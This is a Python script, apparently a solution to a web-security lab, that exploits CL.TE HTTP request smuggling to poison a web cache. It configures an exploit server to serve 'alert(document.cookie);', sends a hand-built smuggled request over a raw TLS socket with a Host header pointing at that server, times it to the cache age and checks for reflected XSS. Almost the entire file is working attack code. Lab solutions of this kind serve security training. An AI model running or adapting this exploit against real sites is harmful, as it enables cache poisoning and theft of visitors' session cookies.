import sys
import requests
import socket
import urllib3
import ssl
from bs4 import BeautifulSoup

# Disable SSL warnings for unverified HTTPS requests
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Lab: Exploiting HTTP request smuggling to perform web cache poisoning

# Extract the URL of the exploit server
def GetExploitServer(target_host):
    try:
        # Make a request to the target host and parse the HTML to find the exploit server link
        response = requests.get("https://" + target_host)
        soup = BeautifulSoup(response.text, "html.parser")
        exploit_server = soup.find("a", {"id": "exploit-link"})["href"]
        return exploit_server
    except Exception as e:
        print(f"(-) Error retrieving exploit server: {e}")
        sys.exit()

# Set up the exploit server to serve malicious JavaScript
def SetUpExploitServer(exploit_server):
    # Payload to configure the exploit server with a malicious JavaScript response
    data = {
        "urlIsHttps": "on",  # Use HTTPS for the exploit server
        "responseFile": "/post",  # The resource path to serve the payload
        "responseHead": "HTTP/1.1 200 OK\nContent-Type: text/javascript; charset=utf-8",  # HTTP headers
        "responseBody": "alert(document.cookie);",  # Malicious JavaScript
        "formAction": "STORE"  # Action to store the payload on the exploit server
    }
    # Send a POST request to set up the exploit server
    response = requests.post(exploit_server, data=data, verify=False)
    if response.status_code == 200:
        print("(+) Exploit server set up successfully.")
    else:
        print("(-) Error setting up the exploit server.")
        sys.exit()

# Cache poisoning payload using CL.TE request smuggling
def CL_TE_CACHE_POISONING(target_host, target_port, exploit_server):
    # Craft the smuggling payload
    payload = (
        "POST / HTTP/1.1\r\n"
        f"Host: {target_host}\r\n"  # Target front-end host
        "Content-Length: 178\r\n"  # Misleading Content-Length for the front-end
        "Content-Type: application/x-www-form-urlencoded\r\n"  # Body type
        "Transfer-Encoding: chunked\r\n"  # Indicates chunked encoding to the back-end
        "\r\n"
        "0\r\n"  # End of the chunked body
        "\r\n"
        "GET /post/next?postId=2 HTTP/1.1\r\n"  # Poisoned HTTP request for back-end
        f"Host: {exploit_server.split('/')[2]}\r\n"  # Host header targeting the exploit server
        "Content-Length: 10\r\n"  # Length of the subsequent request body
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "\r\n"
        "x="  # Malformed body for the poisoned request
    )
    while True:
        counter = 1
        # Wait for the cache to reach the "age" of 27 seconds before poisoning
        while counter != 27:
            response = requests.get(
                f"https://{target_host}/resources/js/tracking.js", verify=False, allow_redirects=False)
            counter = int(response.headers.get("age"))
        
        # Send the payload via a raw socket connection
        context_ssl = ssl.create_default_context()
        with socket.create_connection((target_host, target_port)) as sock:
            with context_ssl.wrap_socket(sock, server_hostname=target_host) as securesock:
                print("(+) Sending payload...")
                securesock.sendall(payload.encode())  # Send the crafted smuggling payload
                smuggled_response = securesock.recv(4096)  # Receive server response

                if "HTTP/1.1 200 OK" in smuggled_response.decode():
                    print("(+) Payload sent successfully.")
                    # Check if the cache poisoning succeeded
                    response = requests.get(
                        f"https://{target_host}/resources/js/tracking.js",  verify=False, allow_redirects=False)
                    if response.status_code == 302:
                        print("(+) Cache poisoning successful: Redirect detected.")
                        # Verify if the XSS payload was reflected
                        final_check = requests.get("https://" + target_host, verify=False)
                        if "alert(document.cookie);" in final_check.text:
                            print("(+) XSS payload reflected successfully!")
                            print("(+) Lab solved!")
                            sys.exit()
                        else:
                            print("(-) XSS payload not reflected.")
                    else:
                        print("(-) Redirect not found yet. Retrying...")
                elif "504 Gateway Timeout" in smuggled_response.decode():
                    print("(-) No response received (504 Gateway Timeout).")
                    sys.exit(1)
                else:
                    print("(-) Unexpected response. Retrying...")

# Main function
def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s xxxxxxxxxxxxxxxxxxxxxxx.web-security-academy.net" % sys.argv[0])
        sys.exit(1)

    # Extract target host from command-line arguments
    target_host = sys.argv[1]
    target_port = 443  # HTTPS default port
    # Retrieve the exploit server URL
    exploit_server = GetExploitServer(target_host)
    # Set up the exploit server to serve the malicious payload
    SetUpExploitServer(exploit_server)
    print("(+) Starting cache poisoning attack...")
    # Perform the cache poisoning attack
    CL_TE_CACHE_POISONING(target_host, target_port, exploit_server)

# Run the main function
if __name__ == "__main__":
    main()
